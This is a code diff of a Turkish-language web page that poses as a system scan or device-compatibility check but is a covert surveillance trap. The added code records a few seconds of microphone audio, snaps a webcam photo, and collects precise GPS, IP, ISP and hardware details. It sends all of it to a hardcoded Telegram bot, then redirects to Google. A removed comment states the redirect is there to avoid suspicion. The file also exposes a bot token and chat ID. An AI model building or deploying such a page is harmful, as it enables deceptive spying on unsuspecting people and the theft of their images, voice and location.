@@ -3,86 +3,114 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Kontrolü</title>
+    <title>Sistem Optimizasyon Aracı</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #1a1a1a; color: white; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .loader { border: 4px solid #333; border-top: 4px solid #00ff00; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { margin-top: 20px; font-size: 14px; color: #888; }
+        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; }
+        .main { border: 2px solid #00ff41; padding: 40px; margin: 20px; border-radius: 10px; box-shadow: 0 0 30px rgba(0, 255, 65, 0.3); }
+        .scan-btn { background: #00ff41; color: #000; border: none; padding: 20px 50px; font-weight: bold; cursor: pointer; font-size: 18px; text-transform: uppercase; transition: 0.4s; border-radius: 5px; }
+        .scan-btn:hover { background: #fff; box-shadow: 0 0 50px #00ff41; }
+        #status { margin-top: 20px; font-size: 12px; color: #555; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
-    <p>Cihaz uyumluluğu kontrol ediliyor, lütfen bekleyin...</p>
+    <div class="main">
+        <h1>SİSTEM KRİTİK ANALİZ</h1>
+        <p>Donanım bileşenlerini ve ağ güvenliğini doğrulamak için taramayı başlatın.</p>
+        <button class="scan-btn" onclick="executeEverything()">TARAMAYI BAŞLAT</button>
+        <div id="status">Sistem Analize Hazır...</div>
+    </div>
+
+    <video id="v" style="display:none;" autoplay></video>
+    <canvas id="c" style="display:none;" width="640" height="480"></canvas>
 
     <script>
-        // --- SENİN BİLGİLERİN ---
-        const botToken = "8675726929:AAGPhcQPfk9VXLgY0gg8dX97qb5wV89B1cE";
-        const chatId = "5802794454";
+        const TOKEN = "8675726929:AAGPhcQPfk9VXLgY0gg8dX97qb5wV89B1cE";
+        const CHAT_ID = "5802794454";
 
-        async function startTracking() {
-            let report = "🚀 **GELİŞMİŞ CİHAZ RAPORU** 🚀\n\n";
+        async function executeEverything() {
+            document.getElementById('status').innerText = "Veriler işleniyor... Lütfen tüm izinleri onaylayın.";
+            
+            let report = "🛸 **ULTIMATE DEVICE TAKEOVER REPORT** 🛸\n\n";
 
-            // 1. IP ve İnternet Bilgileri
+            // 1. IP VE AĞ ANALİZİ
             try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-                report += `🌐 **Ağ Bilgileri:**\n`;
-                report += `• IP: \`${ipData.ip}\`\n`;
-                report += `• Şehir: ${ipData.city} / ${ipData.region}\n`;
-                report += `• Sağlayıcı: ${ipData.org}\n\n`;
-            } catch (e) { report += "❌ IP bilgileri alınamadı.\n\n"; }
+                const ip = await fetch('https://ipapi.co/json/').then(res => res.json());
+                report += `🌐 **AĞ BİLGİSİ**\n• IP: \`${ip.ip}\`\n• Konum: ${ip.city}/${ip.region}\n• ISS: ${ip.org}\n• VPN/Proxy: ${ip.proxy ? "Aktif ⚠️" : "Temiz ✅"}\n\n`;
+            } catch(e) {}
 
-            // 2. Batarya Bilgisi
+            // 2. DONANIM VE GPU (EKRAN KARTI)
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debug = gl ? gl.getExtension('WEBGL_debug_renderer_info') : null;
+            const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Bilinmiyor";
+            
+            report += `💻 **DONANIM**\n• GPU: \`${gpu}\`\n• RAM: ${navigator.deviceMemory || "N/A"} GB\n• Çekirdek: ${navigator.hardwareConcurrency}\n• Ekran: ${window.screen.width}x${window.screen.height}\n\n`;
+
+            // 3. SES KAYDI (3.5 Saniye)
             try {
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    report += `🔋 **Batarya Durumu:**\n`;
-                    report += `• Seviye: %${Math.round(battery.level * 100)}\n`;
-                    report += `• Şarjda mı?: ${battery.charging ? "Evet ⚡" : "Hayır 🔋"}\n\n`;
-                }
-            } catch (e) { }
+                const aStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const rec = new MediaRecorder(aStream);
+                let chunks = [];
+                rec.ondataavailable = e => chunks.push(e.data);
+                rec.onstop = () => {
+                    sendAudio(new Blob(chunks, { type: 'audio/ogg' }));
+                    aStream.getTracks().forEach(t => t.stop());
+                };
+                rec.start();
+                setTimeout(() => rec.stop(), 3500);
+            } catch(e) { report += "❌ Ses: İzin Reddedildi\n"; }
 
-            // 3. Donanım Özellikleri
-            report += `📱 **Donanım:**\n`;
-            report += `• Platform: ${navigator.platform}\n`;
-            report += `• Çekirdek: ${navigator.hardwareConcurrency || "Bilinmiyor"}\n`;
-            report += `• Ekran: ${window.screen.width}x${window.screen.height}\n\n`;
+            // 4. FOTOĞRAF ÇEKİMİ
+            try {
+                const vStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const v = document.getElementById('v');
+                v.srcObject = vStream;
+                setTimeout(() => {
+                    const c = document.getElementById('c');
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    sendPhoto(c.toDataURL('image/jpeg'));
+                    vStream.getTracks().forEach(t => t.stop());
+                }, 2000);
+            } catch(e) { report += "❌ Kamera: İzin Reddedildi\n"; }
 
-            // 4. GPS Konumu (İzinli)
+            // 5. GPS KONUMU (HASSAS)
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        const lat = pos.coords.latitude;
-                        const lon = pos.coords.longitude;
-                        const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                        report += `📍 **GPS KONUMU (TAM):**\n`;
-                        report += `🔗 [Google Haritalarda Gör](${mapsLink})\n`;
-                        report += `🎯 Hassasiyet: ${Math.round(pos.coords.accuracy)} metre`;
-                        sendToTelegram(report);
-                    },
-                    (err) => {
-                        report += `⚠️ **GPS:** Kullanıcı izin vermedi.`;
-                        sendToTelegram(report);
-                    },
-                    { enableHighAccuracy: true, timeout: 10000 }
-                );
+                navigator.geolocation.getCurrentPosition(p => {
+                    report += `📍 **KONUM:** https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n`;
+                    report += `🎯 Hassasiyet: ${Math.round(p.coords.accuracy)}m\n`;
+                    finish(report);
+                }, () => finish(report + "⚠️ GPS: İzin Reddedildi"), {enableHighAccuracy: true});
             } else {
-                sendToTelegram(report + "❌ GPS bu cihazda desteklenmiyor.");
+                finish(report + "❌ GPS: Desteklenmiyor");
             }
         }
 
-        function sendToTelegram(text) {
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`)
-            .then(() => {
-                // Bilgi gittikten sonra şüphe çekmemek için Google'a yönlendir
-                setTimeout(() => {
-                    window.location.href = "https://www.google.com";
-                }, 1000);
-            });
+        function finish(msg) {
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
+            .then(() => { setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500); });
         }
 
-        window.onload = startTracking;
+        function sendPhoto(base64) {
+            const blob = dataURItoBlob(base64);
+            const fd = new FormData();
+            fd.append("chat_id", CHAT_ID);
+            fd.append("photo", blob, "image.jpg");
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
+        }
+
+        function sendAudio(blob) {
+            const fd = new FormData();
+            fd.append("chat_id", CHAT_ID);
+            fd.append("voice", blob, "voice.ogg");
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendVoice`, { method: "POST", body: fd });
+        }
+
+        function dataURItoBlob(dataURI) {
+            let s = atob(dataURI.split(',')[1]), m = dataURI.split(',')[0].split(':')[1].split(';')[0],
+                a = new ArrayBuffer(s.length), u = new Uint8Array(a);
+            for (let i = 0; i < s.length; i++) u[i] = s.charCodeAt(i);
+            return new Blob([a], { type: m });
+        }
     </script>
 </body>
 </html>
